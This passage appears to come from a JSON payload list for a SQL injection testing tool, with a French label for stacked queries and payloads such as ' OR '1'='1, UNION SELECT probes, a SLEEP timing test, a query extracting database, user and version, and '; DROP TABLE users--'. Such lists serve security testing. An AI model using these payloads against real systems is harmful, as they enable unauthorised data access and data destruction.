            "stacked": "Requêtes multiples (; DROP TABLE)"
        },
        "payloads": [
            "' OR '1'='1",
            "1' UNION SELECT NULL--",
            "1' AND SLEEP(5)--",
            "1' AND 1=1--",
            "1' AND 1=2--",
            "1' ORDER BY 1--",
            "1' UNION SELECT database(),user(),version()--",
            "1'; DROP TABLE users--"
